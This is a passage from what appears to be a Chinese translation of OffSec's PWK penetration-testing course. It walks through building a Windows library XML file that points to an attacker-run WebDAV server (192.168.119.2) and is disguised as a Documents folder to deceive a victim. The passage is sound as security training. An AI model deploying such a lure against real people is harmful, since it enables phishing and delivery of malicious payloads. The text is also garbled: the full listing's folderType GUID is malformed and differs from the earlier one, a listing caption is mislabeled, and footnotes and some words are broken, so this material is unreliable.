

# OffSec

使用 Kali Linux 进行渗透测试

库。我们需要指定一个可以在微软文档³53 网页上查到的 GUID。例如，我们将使用 Documents GUID，以便对受害者看起来尽可能具有说服力。

```
<templateInfo>
<folderType>7d49d726-3c21-4f05-99aa-fdc2c9474656</folderType>
</templateInfo>
```

列表 225 - templateInfo 和 folderType

下一个标签标记了库位置部分的开始。在此部分中，我们指定了我们的库文件应该指向的存储位置。我们将开始创建 `searchConnectorDescription`³51 标签，它包含一个搜索连接器³52 列表。搜索连接器被库用于指定到远程位置的连接。我们可以在 `searchConnectorList` 标签内指定一个或多个 `searchConnectorDescription` 元素。为此，我们只只指定了一个示例。

在搜索连接器内部，我们将为我们的 WebDAV 服务器指定信息和参数。我们将使用的第一个标签是 `isDefaultSaveLocation`³54 标签，其值设置为 `true`。此标签决定了当我们选择“另存为项”时 Windows 资源器的行为。接下来，我们将使用 `isSupported` 标签，该标签在微软文档中没有记录，我们将其用于兼容性。我们可以将其设置为 `false`。

最重要的标签是 `url`³55，我们需要将其指向我们之前创建的基于 HTTP 的 WebDAV。它定义在 `simpleLocation`³56 标签内，我们可以将其作为 `locationProvider`³57 元素以更用户友的方式指定远程位置。

```
<searchConnectorList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorList>
```

列表 226 - templateInfo 和 folderType 标签

³50 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/schema-library-foldertypesearchconnectorlist

³51 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/search-connector-library/

³52 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/win32/shell/search-connector-description-schema-typesearchconnectordescription

³53 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/search-library/

³54 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/win32/search/search-connection-defaultsaveslocation

³55 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/search/search-connection-urlsimplelocation

³57 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/search/search-connection-locationprovider

PWK - Copyright © 2023 OffSec Services Ltd. 保留所有。

让我们将代码粘贴到 Visual Studio 中。

我们刚刚查看了库文件中所有部分的 XML 代码。我们现在对库文件的内部工作原理有了基本了解，并可以根据需求对其进行定制。以下列表显示了整个 XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/2009/library">
<name>windows.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>images.dll,-1803</iconReference>
<templateInfo>
<folderType>7d49d726-3321-4f65-99a4-fd2c9474656</folderType>
</templateInfo>
<searchConnectorList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorList>
</libraryDescription>
```

